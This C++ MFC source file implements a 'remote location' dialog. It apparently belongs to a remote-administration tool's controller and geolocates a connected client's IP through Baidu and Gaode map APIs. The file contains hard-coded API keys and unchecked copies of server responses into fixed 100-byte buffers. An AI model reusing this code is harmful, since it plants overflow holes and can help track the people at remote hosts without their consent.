// MapDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "HtmlCtrl.h"
#include "MapDlg.h"
#include "ClientView.h"
#include "TabView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CTabView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CMapDlg dialog


CMapDlg::CMapDlg(CWnd* pParent, int nItem, ClientContext *pContext)
	: CDialog(CMapDlg::IDD, pParent)
{
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_MAP));
	//{{AFX_DATA_INIT(CMapDlg)
	m_1 = _T("");
	m_3 = _T("");
	//}}AFX_DATA_INIT
	m_pPage = new CHtmlCtrl();
	m_bBaidu = TRUE;
	m_bGaode = TRUE;
	m_pContext = pContext;
	m_strLngLatBaidu = " 百度暂不支持此IP定位！";
	m_strLngLatGaode = " 高德暂不支持此IP定位！";
	
// 	sockaddr_in  sockAddr;
// 	memset(&sockAddr, 0, sizeof(sockAddr));
// 	int nSockAddrLen = sizeof(sockAddr);
// 	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
// 	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	CClientView *pView = (CClientView *)pParent;
	//pView = DYNAMIC_DOWNCAST(CClientView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	m_IPAddress = pView->m_pListCtrl->GetItemText(nItem,2);
}

void CMapDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMapDlg)
	DDX_Control(pDX, IDC_TAB_MAP, m_map_tab);
	DDX_Text(pDX, IDC_STATIC_1, m_1);
	DDX_Text(pDX, IDC_STATIC_3, m_3);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMapDlg, CDialog)
	//{{AFX_MSG_MAP(CMapDlg)
	ON_WM_CLOSE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_MAP, OnSelchangeMapTab)
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMapDlg message handlers
#include <afxwin.h>
#include <afxinet.h>
BOOL GetUpdateInfo(char *szText, char *szUrl, char *szStart ,char *szStop)
{
	BOOL bRet = FALSE;
	CString strData;
	CInternetSession MySession(NULL,0);
	CHttpFile* pHttpFile = (CHttpFile*)MySession.OpenURL(szUrl); //str是要打开的地址
	while(pHttpFile->ReadString(strData)) //逐行读取页面数据
	{
 		if(strstr(strData,szStop) != 0)
		{
			char *ip_stop=strstr(strData,szStop); //IP端尾部指针赋值
			*ip_stop='\0'; //截断
			char *ip_start=strstr(strData,szStart)+lstrlen(szStart); //ip段开始部分指针赋值
			if (ip_stop == ip_start)
				break;
			lstrcpy(szText,ip_start);
			bRet = TRUE;
			break;
		}
	}
	pHttpFile->Close();
	delete pHttpFile;
	MySession.Close();
	
	return bRet;
}

CString CMapDlg::HtmlMapBaidu(BOOL bBaiduAvl)
{
	CString html;
	if (bBaiduAvl)
	{
		html+="<!DOCTYPE html>\r\n";
		html+="<html>\r\n";
		html+="<head>\r\n";
		html+="    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\" />\r\n";
		html+="    <meta name=\"viewport\" content=\"initial-scale=1.0, user-scalable=no\" />\r\n";
		html+="    <title>Baidu Map</title>\r\n";
		html+="    <script type=\"text/javascript\" src=\"http://api.map.baidu.com/api?v=2.0&ak=jRz6LX5MLZNeVbghVFWKn0kZiHnUrlCq\"></script>\r\n";
		html+="    <style type=\"text/css\">\r\n";
		html+="        html, body, #container {width:100%;height:100%;overflow:hidden;margin:0;font-size:13px;}\r\n";
		html+="    </style>\r\n";
		html+="</head>\r\n";
		html+="<body>\r\n";
		html+="    <div id=\"container\"></div>\r\n";
		html+="</body>\r\n";
		html+="</html>\r\n\r\n";
		html+="<script type=\"text/javascript\">\r\n";
		html+="    function getParam(paramName) {\r\n";
		html+="        paramValue = \"\", isFound = !1;\r\n";
		html+="        if (this.location.search.indexOf(\"?\") == 0 && this.location.search.indexOf(\"=\") > 1) {\r\n";
		html+="            arrSource = unescape(this.location.search).substring(1, this.location.search.length).split(\"&\"), i = 0;\r\n";
		html+="            while (i < arrSource.length && !isFound) arrSource[i].indexOf(\"=\") > 0 && arrSource[i].split(\"=\")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split(\"=\")[1], isFound = !0), i++\r\n";
		html+="        }\r\n";
		html+="        return paramValue == \"\" && (paramValue = null), paramValue\r\n";
		html+="    }\r\n";
		html+="    var map = new BMap.Map(\"container\");                         // 创建地图实例\r\n";
		html+="    var point = new BMap.Point(getParam(\"lng\"),getParam(\"lat\")); // 创建点坐标\r\n";
		html+="    map.centerAndZoom(point, 14);                                // 初始化地图，设置中心点坐标和地图级别\r\n";
		html+="    var mark = new BMap.Marker(point);                           // 创建标注\r\n";
		html+="    map.addOverlay(mark);                                        // 将标注添加到地图中\r\n";
		html+="    map.enableInertialDragging();                                // 启用地图惯性拖拽，默认禁用\r\n";
		html+="    map.enableContinuousZoom();                                  // 启用连续缩放效果，默认禁用\r\n";
		html+="    map.enableScrollWheelZoom();                                 // 启用滚轮放大缩小，默认禁用\r\n";
		html+="    map.enableKeyboard();                                        // 启用键盘操作，默认禁用\r\n";
		html+="    map.addControl(new BMap.NavigationControl({enableGeolocation:true}));     // 添加平移缩放控件\r\n";
		html+="    map.addControl(new BMap.MapTypeControl());                                // 添加地图类型控件\r\n";
		html+="    map.addControl(new BMap.PanoramaControl({offset:new BMap.Size(20, 40)})); // 添加全景控件\r\n";
		html+="    map.addControl(new BMap.ScaleControl({offset:new BMap.Size(0, 40)}));     // 添加带偏移量的比例尺\r\n";
		html+="    map.addControl(new BMap.OverviewMapControl());                            // 添加缩略地图控件\r\n";
		html+="</script>\r\n";
	}
	else
	{
		html+="<html>\r\n";
		html+="<title>Baidu Map</title>\r\n";
		html+="<body onContextMenu=\"return false\" onSelectStart=\"return false\" style=\"overflow:hidden\">\r\n";
		html+="<table width=100% height=100%><tr><td><center><span style=\"font-size:13px;color:red;\">百度暂不支持此IP定位！</span></center></td></tr></table>\r\n";
		html+="</body>\r\n";
		html+="</html>\r\n";
	}
	
	return html;
}

CString CMapDlg::HtmlMapGaode(BOOL bGaodeAvl)
{
	CString html;
	if (bGaodeAvl)
	{
		html+="<!doctype html>\r\n";
		html+="<html>\r\n";
		html+="<head>\r\n";
		html+="    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" charset=\"gbk\" />\r\n";
		html+="    <meta name=\"viewport\" content=\"initial-scale=1.0, user-scalable=no, width=device-width\" />\r\n";
		html+="    <title>Gaode Map</title>\r\n";
		html+="    <!--引入高德地图JSAPI-->\r\n";
		html+="    <script src=\"http://webapi.amap.com/maps?v=1.4.3&key=ee163a6fdd81ccb02394bea1de4f2e88\"></script>\r\n";
		html+="    <!--引入UI组件库(1.0版本)-->\r\n";
		html+="    <script src=\"http://webapi.amap.com/ui/1.0/main.js?v=1.0.11\"></script>\r\n";
		html+="    <style type=\"text/css\">\r\n";
		html+="        html, body, #container {width:100%;height:100%;overflow:hidden;margin:0;font-size:13px;}\r\n";
		html+="    </style>\r\n";
		html+="</head>\r\n";
		html+="<body>\r\n";
		html+="    <div id=\"container\"></div>\r\n";
		html+="</body>\r\n";
		html+="</html>\r\n\r\n";
		html+="<script>\r\n";
		html+="    function getParam(paramName) {\r\n";
		html+="        paramValue = \"\", isFound = !1;\r\n";
		html+="        if (this.location.search.indexOf(\"?\") == 0 && this.location.search.indexOf(\"=\") > 1) {\r\n";
		html+="            arrSource = unescape(this.location.search).substring(1, this.location.search.length).split(\"&\"), i = 0;\r\n";
		html+="            while (i < arrSource.length && !isFound) arrSource[i].indexOf(\"=\") > 0 && arrSource[i].split(\"=\")[0].toLowerCase() == paramName.toLowerCase() && (paramValue = arrSource[i].split(\"=\")[1], isFound = !0), i++\r\n";
		html+="        }\r\n";
		html+="        return paramValue == \"\" && (paramValue = null), paramValue\r\n";
		html+="    }\r\n";
		html+="    var lnglat = new AMap.LngLat(getParam(\"lng\"),getParam(\"lat\"));\r\n";
		html+="    var map = new AMap.Map('container', {\r\n";
		html+="        resizeEnable:true,\r\n";
		html+="        zoom:13,\r\n";
		html+="        center:lnglat\r\n";
		html+="    });\r\n";
		html+="    var mark = new AMap.Marker({\r\n";
		html+="        map:map,\r\n";
		html+="        position:lnglat\r\n";
		html+="    });\r\n";
		html+="    AMap.plugin(['AMap.ToolBar','AMap.Scale','AMap.OverView'], function(){\r\n";
		html+="        map.addControl(new AMap.ToolBar());\r\n";
		html+="        map.addControl(new AMap.Scale());\r\n";
		html+="        map.addControl(new AMap.OverView());\r\n";
		html+="    });\r\n";
		html+="    AMapUI.loadUI(['control/BasicControl'], function(BasicControl){\r\n";
		html+="        map.addControl(new BasicControl.LayerSwitcher());\r\n";
		html+="    });\r\n";
		html+="</script>\r\n";
	}
	else
	{
		html+="<html>\r\n";
		html+="<title>Gaode Map</title>\r\n";
		html+="<body onContextMenu=\"return false\" onSelectStart=\"return false\" style=\"overflow:hidden\">\r\n";
		html+="<table width=100% height=100%><tr><td><center><span style=\"font-size:13px;color:red;\">高德暂不支持此IP定位！</span></center></td></tr></table>\r\n";
		html+="</body>\r\n";
		html+="</html>\r\n";
	}
	
	return html;
}

int ConvUtf8ToAnsi(CString& strSource, CString& strChAnsi)
{  
	if (strSource.GetLength() <= 0)
		return 0;
	
	CString strWChUnicode;
	
	strSource.TrimLeft();
	strSource.TrimRight();   
	strChAnsi.Empty();
	
	int iLenByWChNeed = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(), //MultiByteToWideChar
		NULL, 0);
	
	int iLenByWchDone = MultiByteToWideChar(CP_UTF8, 0,
		strSource.GetBuffer(0),
		strSource.GetLength(),
		(LPWSTR)strWChUnicode.GetBuffer(iLenByWChNeed * 2),
		iLenByWChNeed); //MultiByteToWideChar
	
	strWChUnicode.ReleaseBuffer(iLenByWchDone * 2);
	
	int iLenByChNeed  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		NULL, 0,
		NULL, NULL); 
	
	int iLenByChDone  = WideCharToMultiByte(CP_ACP, 0,
		(LPCWSTR)strWChUnicode.GetBuffer(0),
		iLenByWchDone,
		strChAnsi.GetBuffer(iLenByChNeed),
		iLenByChNeed,
		NULL, NULL);
	
	strChAnsi.ReleaseBuffer(iLenByChDone);
	
	if (iLenByWChNeed != iLenByWchDone || iLenByChNeed != iLenByChDone)
		return 1;
	
	return 0;   
}

BOOL CMapDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	VERIFY(m_pPage->CreateFromStatic(IDC_HTMLVIEW, this));
	
	CString strText;
	strText.Format("\\\\%s - 远程定位",m_IPAddress);
	SetWindowText(strText);
	
	CFile file; CFileStatus status;
	sprintf(m_szAppBaidu,"%s\\Plugins\\Baidu.html",((CClientApp *)AfxGetApp())->AppPath);
	if (!file.GetStatus(m_szAppBaidu, status))
	{
		if (file.Open(m_szAppBaidu, CFile::modeWrite | CFile::modeCreate))
		{
			file.Write(HtmlMapBaidu(TRUE).GetBuffer(0),HtmlMapBaidu(TRUE).GetLength());
			file.Close();
			SetFileAttributes(m_szAppBaidu,FILE_ATTRIBUTE_HIDDEN);
		}
	}
	sprintf(m_szAppBaidu,"%s\\Plugins\\BaiduE.html",((CClientApp *)AfxGetApp())->AppPath);
	if (!file.GetStatus(m_szAppBaidu, status))
	{
		if (file.Open(m_szAppBaidu, CFile::modeWrite | CFile::modeCreate))
		{
			file.Write(HtmlMapBaidu(FALSE).GetBuffer(0),HtmlMapBaidu(FALSE).GetLength());
			file.Close();
			SetFileAttributes(m_szAppBaidu,FILE_ATTRIBUTE_HIDDEN);
		}
	}
	sprintf(m_szAppGaode,"%s\\Plugins\\Gaode.html",((CClientApp *)AfxGetApp())->AppPath);
	if (!file.GetStatus(m_szAppGaode, status))
	{
		if (file.Open(m_szAppGaode, CFile::modeWrite | CFile::modeCreate))
		{
			file.Write(HtmlMapGaode(TRUE).GetBuffer(0),HtmlMapGaode(TRUE).GetLength());
			file.Close();
			SetFileAttributes(m_szAppGaode,FILE_ATTRIBUTE_HIDDEN);
		}
	}
	sprintf(m_szAppGaode,"%s\\Plugins\\GaodeE.html",((CClientApp *)AfxGetApp())->AppPath);
	if (!file.GetStatus(m_szAppGaode, status))
	{
		if (file.Open(m_szAppGaode, CFile::modeWrite | CFile::modeCreate))
		{
			file.Write(HtmlMapGaode(FALSE).GetBuffer(0),HtmlMapGaode(FALSE).GetLength());
			file.Close();
			SetFileAttributes(m_szAppGaode,FILE_ATTRIBUTE_HIDDEN);
		}
	}
	
	if (m_IPAddress == "127.0.0.1")
	{
		AfxGetMainWnd()->MessageBox("不支持127.0.0.1定位！",strText,MB_ICONWARNING);
		SetTimer(1, 0, NULL);
		return FALSE;
	}
	
	m_map_tab.InsertItem(0, "百度地图");
	m_map_tab.InsertItem(1, "高德地图");
	RECT rectClient;
	m_pPage->SetParent(&m_map_tab);
	m_map_tab.GetClientRect(&rectClient);
	m_map_tab.AdjustRect(FALSE,&rectClient);
	rectClient.left -= 4;
	rectClient.top -= 1;
	rectClient.right += 4;
	rectClient.bottom += 4;
	m_pPage->MoveWindow(&rectClient);
	
	CString strUrl;
	strUrl.Format("http://api.map.baidu.com/location/ip?ip=%s&ak=jRz6LX5MLZNeVbghVFWKn0kZiHnUrlCq&coor=bd09ll",m_IPAddress);
	
	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"{\"x\":\"","\",\"y\":"))
		{
			m_x_baidu = strTitle;
		}
		
		memset(strTitle,0,sizeof(strTitle));
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"\",\"y\":\"" ,"\"}},\""))
		{
			m_y_baidu = strTitle;
		}
	}
	catch (...)
	{
		//MessageBox("暂不不支持此IP定位！","提示",MB_ICONINFORMATION);
		//DestroyWindow();
		//return FALSE;
		m_bBaidu = FALSE;
	}
	
	if (m_x_baidu == "" || m_y_baidu == "")
	{
		//MessageBox("暂不不支持此IP定位！","提示",MB_ICONINFORMATION);
		//DestroyWindow();
		//return FALSE;
		m_bBaidu = FALSE;
	}
	
	strUrl.Format("http://restapi.amap.com/v3/ip?ip=%s&output=xml&key=0eef20dd537b7684f22249ebf76fdd6f",m_IPAddress);
	
	try
	{
		char strTitle[100] = {0};
		if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"<rectangle>","</rectangle>"))
		{
			double f_x_gaode1, f_x_gaode2, f_y_gaode1, f_y_gaode2;
			sscanf(strTitle, "%lf,%lf;%lf,%lf", &f_x_gaode1, &f_y_gaode1, &f_x_gaode2, &f_y_gaode2);
			m_x_gaode.Format("%f", (f_x_gaode1+f_x_gaode2)/2);
			m_y_gaode.Format("%f", (f_y_gaode1+f_y_gaode2)/2);
		}
	}
	catch (...)
	{
		//MessageBox("暂不不支持此IP定位！","提示",MB_ICONINFORMATION);
		//DestroyWindow();
		//return FALSE;
		m_bGaode = FALSE;
	}
	
	if (m_x_gaode == "" || m_y_gaode == "")
	{
		//MessageBox("暂不不支持此IP定位！","提示",MB_ICONINFORMATION);
		//DestroyWindow();
		//return FALSE;
		m_bGaode = FALSE;
	}
	
	if (!m_bBaidu && !m_bGaode)
	{
		AfxGetMainWnd()->MessageBox("暂不不支持此IP定位！",strText,MB_ICONWARNING);
		SetTimer(1, 0, NULL);
		return FALSE;
	}
	
	//char szSelfFilePath[MAX_PATH];
	//GetModuleFileName(NULL,szSelfFilePath,MAX_PATH);
	if (m_bBaidu)
		sprintf(m_szAppBaidu,"%s\\Plugins\\Baidu.html?lng=%s&lat=%s",((CClientApp *)AfxGetApp())->AppPath,m_x_baidu,m_y_baidu);
		//sprintf(m_szAppBaidu,"res://%s/%d?lng=%s&lat=%s",szSelfFilePath,IDR_BAIDU,m_x_baidu,m_y_baidu);
	else
		sprintf(m_szAppBaidu,"%s\\Plugins\\BaiduE.html",((CClientApp *)AfxGetApp())->AppPath);
		//sprintf(m_szAppBaidu,"res://%s/%d",szSelfFilePath,IDR_BAIDUE);
	if (m_bGaode)
		sprintf(m_szAppGaode,"%s\\Plugins\\Gaode.html?lng=%s&lat=%s",((CClientApp *)AfxGetApp())->AppPath,m_x_gaode,m_y_gaode);
		//sprintf(m_szAppGaode,"res://%s/%d?lng=%s&lat=%s",szSelfFilePath,IDR_GAODE,m_x_gaode,m_y_gaode);
	else
		sprintf(m_szAppGaode,"%s\\Plugins\\GaodeE.html",((CClientApp *)AfxGetApp())->AppPath);
		//sprintf(m_szAppGaode,"res://%s/%d",szSelfFilePath,IDR_GAODEE);
	
	CString strTemp, strAddress;
	if (m_bBaidu)
	{
		strUrl.Format("http://api.map.baidu.com/geocoder/v2/?callback=renderReverse&location=%s,%s&output=xml&pois=1&ak=jRz6LX5MLZNeVbghVFWKn0kZiHnUrlCq",m_y_baidu,m_x_baidu);
		
		try
		{
			char strTitle[100] = {0};
			if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"<formatted_address>","</formatted_address>"))
			{
				strTemp = strTitle;
				ConvUtf8ToAnsi(strTemp,strAddress);
			}
		}
		catch (...)
		{
			//MessageBox("百度逆地理编码时出现错误！","提示",MB_ICONINFORMATION);
			strAddress = "百度逆地理编码时出现错误！";
		}
		
		m_strLngLatBaidu.Format("IP地址:【%s】 经度【%s】 纬度【%s】",m_IPAddress,m_x_baidu,m_y_baidu);
		m_strAddressBaidu.Format("地理位置:【%s】",strAddress);
	}
	if (m_bGaode)
	{
		strUrl.Format("http://restapi.amap.com/v3/geocode/regeo?output=xml&location=%s,%s&key=0eef20dd537b7684f22249ebf76fdd6f",m_x_gaode,m_y_gaode);
		
		try
		{
			char strTitle[100] = {0};
			if (GetUpdateInfo(strTitle,strUrl.GetBuffer(0),"<formatted_address>","</formatted_address>"))
			{
				strTemp = strTitle;
				ConvUtf8ToAnsi(strTemp,strAddress);
			}
		}
		catch (...)
		{
			//MessageBox("高德逆地理编码时出现错误！","提示",MB_ICONINFORMATION);
			strAddress = "高德逆地理编码时出现错误！";
		}
		
		m_strLngLatGaode.Format("IP地址:【%s】 经度【%s】 纬度【%s】",m_IPAddress,m_x_gaode,m_y_gaode);
		m_strAddressGaode.Format("地理位置:【%s】",strAddress);
	}
	
	if (m_bBaidu)
	{
		m_map_tab.SetCurSel(0);
		m_1 = m_strLngLatBaidu;
		m_3 = m_strAddressBaidu;
		m_pPage->Navigate2(m_szAppBaidu,navNoHistory);
		//m_pPage->LoadFromResource(IDR_BAIDU);
	}
	else
	{
		m_map_tab.SetCurSel(1);
		m_1 = m_strLngLatGaode;
		m_3 = m_strAddressGaode;
		m_pPage->Navigate2(m_szAppGaode,navNoHistory);
		//m_pPage->LoadFromResource(IDR_GAODE);
	}
	UpdateData(FALSE);
	
	//界面居中显示
	this->CenterWindow(CWnd::GetDesktopWindow());
	this->ShowWindow(SW_SHOW);
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

void CMapDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	KillTimer(1);
	DestroyWindow();
}

void CMapDlg::OnClose()
{
	// TODO: Add extra validation here
	DestroyWindow();
}

void CMapDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete m_pPage; delete this;
	CDialog::PostNcDestroy();
}

void CMapDlg::OnSelchangeMapTab(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	switch (m_map_tab.GetCurSel())
	{
	case 0:
		m_1 = m_strLngLatBaidu;
		m_3 = m_strAddressBaidu;
		UpdateData(FALSE);
		m_pPage->Navigate2(m_szAppBaidu,navNoHistory);
		/*if (m_bBaidu)
			m_pPage->LoadFromResource(IDR_BAIDU);
		else
			m_pPage->LoadFromResource(IDR_BAIDUE);*/
		break;
	case 1:
		m_1 = m_strLngLatGaode;
		m_3 = m_strAddressGaode;
		UpdateData(FALSE);
		m_pPage->Navigate2(m_szAppGaode,navNoHistory);
		/*if (m_bGaode)
			m_pPage->LoadFromResource(IDR_GAODE);
		else
			m_pPage->LoadFromResource(IDR_GAODEE);*/
		break;
	}
	*pResult = 0;
}

BOOL CMapDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}
